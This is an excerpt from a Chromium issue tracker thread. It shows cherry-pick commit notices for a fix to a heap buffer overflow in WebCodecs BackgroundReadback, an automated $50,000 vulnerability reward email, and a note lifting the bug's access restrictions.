### dx...@google.com (2026-02-26)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Eugene Zemtsov [eugene@chromium.org](mailto:eugene@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7610123>

[M144] media: Fix heap buffer overflow in WebCodecs BackgroundReadback

---


Expand for full commit details
```
     
    This fixes a mismatch between coded_size and visible_rect during GPU 
    readback. The code was writing the full coded size into a destination 
    pointer that was offset by the visible_rect origin, causing an 
    out-of-bounds write. 
     
    (cherry picked from commit 72f220565650fc67e72f0e6c176177ad212b2a54) 
     
    Bug: 485683110 
    Test: https://chromium-review.googlesource.com/c/chromium/src/+/5667032 
    Change-Id: I30e58c2f5f71a55d4e63eaa047b64f6b88904faa 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7596362 
    Reviewed-by: Thomas Guilbert <tguilbert@chromium.org> 
    Commit-Queue: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1587594} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7610123 
    Reviewed-by: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4763} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `third_party/blink/renderer/modules/webcodecs/background_readback.cc`

---

Hash: [1878ea29f7ce7c85115509e0b199757038b3c820](https://chromiumdash.appspot.com/commit/1878ea29f7ce7c85115509e0b199757038b3c820)  

Date: Thu Feb 26 00:55:23 2026


---

### dx...@google.com (2026-02-26)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Eugene Zemtsov [eugene@chromium.org](mailto:eugene@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7608789>

[M146] media: Fix heap buffer overflow in WebCodecs BackgroundReadback

---


Expand for full commit details
```
     
    This fixes a mismatch between coded_size and visible_rect during GPU 
    readback. The code was writing the full coded size into a destination 
    pointer that was offset by the visible_rect origin, causing an 
    out-of-bounds write. 
     
    (cherry picked from commit 72f220565650fc67e72f0e6c176177ad212b2a54) 
     
    Bug: 485683110 
    Test: https://chromium-review.googlesource.com/c/chromium/src/+/5667032 
    Change-Id: I30e58c2f5f71a55d4e63eaa047b64f6b88904faa 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7596362 
    Reviewed-by: Thomas Guilbert <tguilbert@chromium.org> 
    Commit-Queue: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1587594} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7608789 
    Reviewed-by: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#1382} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `third_party/blink/renderer/modules/webcodecs/background_readback.cc`

---

Hash: [035b1b482375bfb045617b7d1303f2ad85b65eee](https://chromiumdash.appspot.com/commit/035b1b482375bfb045617b7d1303f2ad85b65eee)  

Date: Thu Feb 26 01:35:00 2026


---

### sp...@google.com (2026-03-11)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
High Quality demonstrating controlled write. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-02)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485683110)*
